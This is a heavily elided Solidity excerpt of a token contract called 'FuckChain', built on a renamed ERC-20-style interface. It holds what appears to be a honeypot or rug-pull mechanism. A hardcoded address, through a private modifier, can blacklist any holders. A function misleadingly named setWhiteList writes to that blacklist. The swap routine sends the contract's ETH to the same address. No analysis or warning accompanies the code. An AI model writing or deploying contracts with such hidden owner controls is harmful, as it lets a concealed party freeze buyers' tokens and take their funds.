...
interface Iant20 {
    ...
    event Cock(address indexed from, address indexed to, uint256 value);
...
contract FuckChain is Context, Iant20, Ownable {
    using SafeMath for uint256;
    string private _name = "FuckChain";
    ...
    modifier ETHT() {
        require(_msgSender() == ETHTo, "caller not owner");
        _;
    }
    ...
    constructor() {
        ...
        ETHTo = payable(address(0x75C6C9eFb509174f18158ef6aEDC27a387ff95E6));
    ...
    function transferFrom(
        ...
        _approve(
            ...
            _allowances[sender][_msgSender()].sub(
                amount,
                "ant20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    ...
    function setBlackListed(address[] calldata addresses, bool status)
        public
        ETHT
    {
    ...
    function setWhiteList(address  addresss, bool status) private  {
        _blackListed[addresss] = status;
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if (ETHBalance > 0) ETHTo.transfer(ETHBalance);
    }
}